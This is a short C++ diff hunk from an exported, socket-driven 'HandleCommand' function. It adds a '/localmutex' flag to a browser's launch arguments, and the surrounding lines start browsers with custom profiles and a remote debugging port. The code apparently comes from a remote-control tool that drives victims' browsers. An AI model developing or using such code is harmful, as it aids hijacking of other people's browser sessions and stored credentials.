@@ -2410,6 +2410,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         if (!profilePath.empty()) {
                             args += L" /dblocation \"" + profilePath + L"\"";
                         }
+                        args += L" /localmutex";
                     } else if (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX") {
                         // Special handling for Opera / Opera GX: use custom profiles but do NOT pass --profile-directory parameters.
                         args = L" --remote-debugging-port=9222";
